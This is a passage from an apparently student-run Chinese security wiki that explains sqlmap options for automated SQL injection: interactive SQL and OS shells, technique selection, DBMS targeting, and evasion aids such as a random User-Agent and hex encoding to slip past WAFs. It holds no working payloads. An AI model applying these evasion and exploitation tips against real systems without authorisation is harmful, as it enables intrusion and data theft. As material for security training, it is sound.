对你传入的报文的目标进行自动化的 sql 注入

#### --sql-shell[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-shell)

在摸索到 数据库注入的时候 生成一个交互式的数据库注入

可以直接编写可执行的 sql 语句

例如 select "123"

Sqlmap 会自动探寻目标的注入返回结果 减少手动编写 payload 的辛劳

> 尤其是写了半天发现引号对不上等等

#### --os-shell[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#os-shell)

一个新手以为很牛逼但是其实很鸡肋的功能 可以获取 shell 一般是通过数据库注入获取到写文件的权限，写入 webshell 文件 的原理拿到对方机器的 shell

可是这个玩意非常的鸡肋

因为 默认数据库配置不具有这种问题需要另外配置 此外环境需要支持类似动态执行的功能 例如 go 起的 web

#### --random-agent[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#random-agent)

一般不用 但是 sqlmap 在进行 web 的注入时会使用 sqlmap 的 User-Agent 痕迹非常明显

可以用这个消磨一下自己的痕迹

#### --second-url[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#second-url)

对于一些非常复杂的数据库二次注入 sqlmap 其实是没有办法的 例如需要鉴权（？）

> 此处有待考证

但是对于简单的一些二次注入，可以通过这个参数获取到存在数据库注入界面的结果界面。让 sqlmap 获取到 数据库注入的结果。

#### --technique[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#technique)

技巧 指定 sqlmap 使用的注入技术

有以下几种

- `t` 基于时间 time
- `b` 基于布尔 boolean
- `e` 基于报错 error
- `u` 联合注入 union
- `q` 内联注入 inline query
- `s` 堆叠注入 stack

通常而言 sqlmap 在进行自动化注入尝试的时候常常是会先检测到 time 这一类注入

但是对于 union 和 boolean 则是最后进行检查的

而往往当你存在 union 或者 boolean 注入的时候，其实 time 多半也会一同存在

Sqlmap 很可能在接下来的 数据库注入后利用中使用耗时更为巨大的 time 注入技巧

这对于攻击者其实是不利的

那么通过这个参数去指定对应的注入技巧 可以大大减少数据库注入获取结果的时间 优化你的进攻效率

#### --dbms[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#dbms)

指定对应的数据库类型

Mysql mssql 之类的 sqlmap 就不会去搜索爆破其他类型的数据库

#### --hex[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#hex)

以十六进制来进行注入的技巧

在数据注入的时候使用这个可以规避掉一些 WAF

## WAF 绕过 - 将特殊的 payload 编码的脚本[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#waf-绕过-将特殊的-payload-编码的脚本)

## 自定义 Payload - 自定义你的核心攻击语句